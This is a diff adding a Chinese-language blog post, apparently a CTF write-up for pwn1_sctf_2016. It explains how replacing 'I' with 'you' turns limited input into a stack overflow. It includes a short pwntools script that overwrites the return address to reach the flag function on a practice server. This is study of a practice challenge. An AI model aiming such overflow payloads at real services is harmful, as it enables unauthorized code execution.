@@ -214,6 +214,67 @@
             
 
   
+    <article id="post-pwn1_sctf_2016" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>分析vuln函数</p>
+<p><img src="/images/pwn1_sctf_2016/Snipaste_2023-01-22_11-57-16.png"></p>
+<p>fget函数限制输入，看似无法栈溢出，但下方有一个replace函数，可以将i替换为you，那么就可以通过输入i从而造成栈溢出</p>
+<p>其他步骤与前面题解法相似</p>
+<p><img src="/images/pwn1_sctf_2016/Snipaste_2023-01-22_13-41-55.png"></p>
+<p>查看栈长度，需要填充0x20+4个字节的数据</p>
+<p>再查看返回flag函数的地址</p>
+<p><img src="/images/pwn1_sctf_2016/Snipaste_2023-01-22_13-45-05.png"></p>
+<p>便可由此写出exp</p>
+<p>from pwn import *</p>
+<p>io &#x3D; remote(‘node4.buuoj.cn’, 28712)<br>payload &#x3D; b’I’*21 + b’a’*1 + p32(0x8048F0D)<br>io.sendline(payload)<br>io.interactive() </p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/01/21/pwn1_sctf_2016/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-warmup_csaw_2016" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
